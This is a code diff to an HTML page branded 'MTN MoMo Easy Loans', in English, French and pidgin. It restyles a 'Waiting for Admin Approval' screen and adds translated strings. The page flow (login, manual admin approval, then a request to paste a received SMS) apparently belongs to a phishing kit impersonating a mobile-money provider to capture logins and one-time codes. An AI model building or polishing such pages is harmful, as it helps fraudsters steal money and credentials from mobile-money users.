@@ -596,22 +596,31 @@
       </div>
     </div>
 
-    <!-- ─── Wait login approval ─── -->
+     <!-- ─── Wait login approval (redesigned) ─── -->
     <div id="page-wait-login-approval" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub" data-i18n="navSubEasyLoans">Easy Loans</div>
+      <div style="min-height:100vh; background:#003366; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:30px 20px; text-align:center; color:#fff; position:relative;">
+
+        <button class="nav-lang" style="position:absolute; top:20px; right:20px;" onclick="showGate()">🌐</button>
+
+        <div style="width:120px; height:120px; border-radius:50%; background:rgba(255,255,255,0.06); border:2px solid rgba(255,215,0,0.35); display:flex; align-items:center; justify-content:center; margin-bottom:28px;">
+          <div style="width:80px; height:80px; border-radius:50%; background:rgba(255,215,0,0.15); display:flex; align-items:center; justify-content:center; font-size:2.4rem;">⏳</div>
         </div>
-        <button class="nav-lang" onclick="showGate()">🌐</button>
-      </div>
-      <div style="padding: 24px; text-align: center;">
-        <h2 data-i18n="waitTitle">Waiting for approval</h2>
-        <p><span data-i18n="waitAppId">Application ID:</span> <span id="waitAppId"></span></p>
-        <div class="spinner" style="margin-top: 20px;"></div>
+
+        <h2 style="font-size:1.5rem; font-weight:700; color:#fff; margin-bottom:12px;" data-i18n="waitTitleBig">Waiting for Admin Approval</h2>
+        <p style="font-size:0.95rem; color:rgba(255,255,255,0.75); max-width:340px; margin-bottom:26px; line-height:1.5;" data-i18n="waitSub">Your login is pending admin verification. Please wait...</p>
+
+        <div style="border:1.5px solid rgba(255,215,0,0.55); border-radius:8px; padding:12px 22px; background:rgba(255,215,0,0.08); margin-bottom:26px;">
+          <span style="font-size:0.9rem; color:#FFD700; font-weight:500; letter-spacing:0.02em;" data-i18n="waitBox">Admin is reviewing your request...</span>
+        </div>
+
+        <p style="font-size:0.75rem; color:rgba(255,255,255,0.55);">
+          <span data-i18n="waitAppId">Application ID:</span>
+          <span id="waitAppId" style="color:#FFD700; font-weight:600;">—</span>
+        </p>
+
       </div>
     </div>
+   
 
     <!-- ─── SMS paste ─── -->
     <div id="page-sms-paste" class="page">
@@ -763,6 +772,9 @@
       loginBtn: "LOGIN",
       footerCopy: "© 2026 MTN MoMo Loans. All rights reserved.",
       waitTitle: "Waiting for approval",
+      waitTitleBig: "Waiting for Admin Approval",
+      waitSub: "Your login is pending admin verification. Please wait...",
+      waitBox: "Admin is reviewing your request...",
       waitAppId: "Application ID:",
       smsLabel: "Paste SMS message",
       smsPlaceholder: "Paste the SMS you received...",
@@ -856,6 +868,9 @@
       loginBtn: "CONNEXION",
       footerCopy: "© 2026 MTN MoMo Loans. Tous droits réservés.",
       waitTitle: "En attente d'approbation",
+            waitTitleBig: "En attente d'approbation de l'administrateur",
+      waitSub: "Votre connexion est en attente de vérification par l'administrateur. Veuillez patienter...",
+      waitBox: "L'administrateur examine votre demande...",
       waitAppId: "ID de la demande:",
       smsLabel: "Collez le message SMS",
       smsPlaceholder: "Collez le SMS que vous avez reçu...",
@@ -948,6 +963,9 @@
       loginBtn: "LOGIN",
       footerCopy: "© 2026 MTN MoMo Loans. Tout droit gardé.",
       waitTitle: "Attends Approbation",
+            waitTitleBig: "Attends Admin Approuve",
+      waitSub: "Admin dey check ton login. Attends small time...",
+      waitBox: "Admin dey look ton demande...",
       waitAppId: "ID Demande:",
       smsLabel: "Colle Message SMS",
       smsPlaceholder: "Colle le SMS wey tu receive...",
